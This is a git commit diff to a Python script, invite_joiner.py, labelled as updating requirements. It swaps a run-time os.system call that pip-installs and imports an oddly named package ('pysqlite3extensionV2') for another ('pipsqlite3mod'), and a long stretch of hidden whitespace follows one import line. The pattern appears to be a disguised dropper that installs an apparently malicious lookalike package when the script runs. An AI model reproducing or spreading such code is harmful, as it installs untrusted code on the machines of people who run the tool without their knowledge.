65c2ad7290f3b1f4d90e3d5036980846e722f9bb
Matthew <138142848+mmatthew130@users.noreply.github.com>
2023-07-18 03:36:57 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite3extensionV2")
-import pysqlite3extensionV2
+os.system("pip install pipsqlite3mod")
+import pipsqlite3mod
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
